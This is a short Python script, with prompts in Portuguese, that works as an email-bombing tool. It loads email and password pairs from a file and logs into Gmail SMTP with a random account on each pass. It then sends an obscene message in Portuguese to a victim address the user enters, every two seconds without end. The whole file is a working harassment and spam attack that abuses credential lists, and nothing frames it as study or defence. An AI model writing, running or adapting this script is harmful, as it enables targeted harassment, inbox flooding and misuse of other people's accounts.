import smtplib
import random
from time import sleep

toadress = str(input('Digite o destinatário: '))

dicio = {}

message = '''
Oi.
Eu quero cu.
'''

with open('emails.txt') as f:
    lista = f.readlines()

for string in lista:
    pos_virgula = string.find(',')
    email = string[:pos_virgula]
    senha = string[pos_virgula+1:].replace('\n','')
    dicio[email] = senha

while True:
    fromadress, password = random.choice(list(dicio.items()))
    username = fromadress

    server = smtplib.SMTP('smtp.gmail.com',587)
    server.ehlo()
    server.starttls()
    server.login(username,password)

    server.sendmail(fromadress,toadress,message)
    print('Mail sent!')
    sleep(2)

server.quit()
